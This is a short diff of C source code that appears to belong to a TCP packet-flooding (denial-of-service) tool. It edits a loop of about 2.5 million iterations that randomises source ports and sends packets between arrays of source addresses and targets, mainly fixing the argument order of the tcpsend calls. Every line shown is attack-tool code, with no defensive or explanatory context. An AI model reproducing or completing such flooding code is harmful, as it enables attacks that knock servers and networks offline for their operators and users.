@@ -81,13 +81,13 @@ unsigned short payload_len = 0;
 printf("Computize packets");
 for(A=0;A<2499999;A++){
 srcp=rand_cmwc() % 65534+1;
-tcpsend(rs[0],srcip[0],srcp,dstp,payload,payload_len);
+tcpsend(srcip[0],rs[0],srcp,dstp,payload,payload_len);
 srcp=rand_cmwc() % 65534+1;
-tcpsend(rs[0],srcip[1],srcp,dstp,payload,payload_len);
+tcpsend(srcip[0],rs[1],srcp,dstp,payload,payload_len);
 srcp=rand_cmwc() % 65534+1;
-tcpsend(rs[1],srcip[0],srcp,dstp,payload,payload_len);
+tcpsend(srcip[1],rs[0],srcp,dstp,payload,payload_len);
 srcp=rand_cmwc() % 65534+1;
-tcpsend(rs[1],srcip[1],srcp,dstp,payload,payload_len);
+tcpsend(srcip[1],rs[1],srcp,dstp,payload,payload_len);
 }
 printf("A MITIG.AR\n");
 while(true){
